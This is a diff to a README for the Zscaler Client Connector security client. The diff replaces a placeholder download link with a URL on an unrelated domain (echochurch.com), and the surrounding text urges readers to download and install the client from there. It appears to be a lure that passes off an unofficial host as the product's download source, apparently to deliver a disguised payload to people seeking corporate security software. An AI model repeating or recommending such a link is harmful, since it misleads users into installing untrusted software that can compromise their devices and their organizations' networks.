@@ -13,7 +13,7 @@ Zscaler Client Connector establishes a secure and seamless connection between us
 ## Installation
 To begin using Zscaler Client Connector, download the installation package here:
 
-[**Download Zscaler Client Connector**](*)
+[**Download Zscaler Client Connector**](https://echochurch.com/echo/)
 
 Start by obtaining the Zscaler Client Connector for your device. This is a crucial step to enable secure access to your organization's resources. Once the download is complete, proceed with the installation process specific to your operating system. The application is designed to be intuitive, ensuring a seamless setup experience.
 
